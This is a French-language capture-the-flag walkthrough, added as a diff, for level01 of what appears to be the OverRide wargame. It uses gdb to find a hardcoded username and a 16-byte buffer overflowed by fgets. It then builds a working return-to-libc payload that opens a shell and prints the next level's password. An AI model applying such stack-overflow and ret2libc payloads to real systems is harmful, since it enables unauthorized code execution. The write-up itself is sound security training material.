@@ -1,0 +1,81 @@
+Au lancement du binaire un prompt apparait et nous demande un Username.
+
+La fonction verify_username comme son nom l'indique effectue une comparaison
+entre notre input et la string "dat_wil" que l'on retrouve en dur dans la fonction
+
+   0x08048478 <+20>:	mov    $0x804a040,%edx
+   0x0804847d <+25>:	mov    $0x80486a8,%eax
+
+(gdb) x/s 0x80486a8
+0x80486a8:	 "dat_wil"
+(gdb) x/s 0x804a040
+0x804a040 <a_user_name>:	 "okok\n"
+
+level01@OverRide:~$ ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password:
+
+Nous avons le username..
+
+Pour le password, dans la fonction verify_user_pass on y voit en dur "admin"
+cependant il ne fonctionne pas en password.
+
+   0x08048565 <+149>:	movl   $0x64,0x4(%esp)
+   0x0804856d <+157>:	lea    0x1c(%esp),%eax
+   0x08048571 <+161>:	mov    %eax,(%esp)
+   0x08048574 <+164>:	call   0x8048370 <fgets@plt>
+
+Ici le fgets qui va recuperer notre password, sera limite a 100 char (0x64)
+cependant le buffer qui lui ai envoye en $esp + 0x1c est de 16 octets comme
+nous l'indique ce qui semble etre un bzero effectue dessus:
+
+   0x080484db <+11>:	lea    0x1c(%esp),%ebx
+   0x080484df <+15>:	mov    $0x0,%eax
+   0x080484e4 <+20>:	mov    $0x10,%edx
+
+Notre programme devrait donc segfault..
+
+(gdb) run
+Starting program: /home/users/level01/level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9
+nope, incorrect password...
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+
+Comme prevu, nous en profitons pour recuperer l'offset qui est de 80 octets.
+Nous n'avons plus qu'a build notre script pour pouvoir lancer notre return2libc.
+
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+(gdb) find &system,+99999999,"/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+(gdb)
+
+Les adresses necessaire a la creation du script on ete recuperer, l'offset aussi
+nous n'avons plus qu'a run celui-ci.
+
+level01@OverRide:~$ (python -c 'print "dat_wil\n"+"A"*80+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"'; cat) | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+whoami
+level02
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
